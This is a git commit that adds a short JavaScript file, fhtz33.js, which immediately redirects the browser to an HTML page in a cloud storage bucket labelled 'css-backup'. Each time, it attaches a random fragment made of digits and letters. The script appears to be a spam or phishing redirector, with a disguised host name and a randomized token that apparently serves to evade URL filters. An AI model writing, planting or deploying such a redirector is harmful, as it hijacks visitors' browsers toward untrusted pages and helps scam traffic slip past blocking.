fed40a7f886d31d49c1dc4d62a5836aa65a0a58c
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-11 00:44:55 +0800

    Create fhtz33.js

---
+++ fhtz33.js
@@ -0,0 +1,17 @@
+var urls=[
+' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/821fb0147b8f4f3391f6c8dbd600389a.html#{nnnnnnn}{wwww}',
+];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
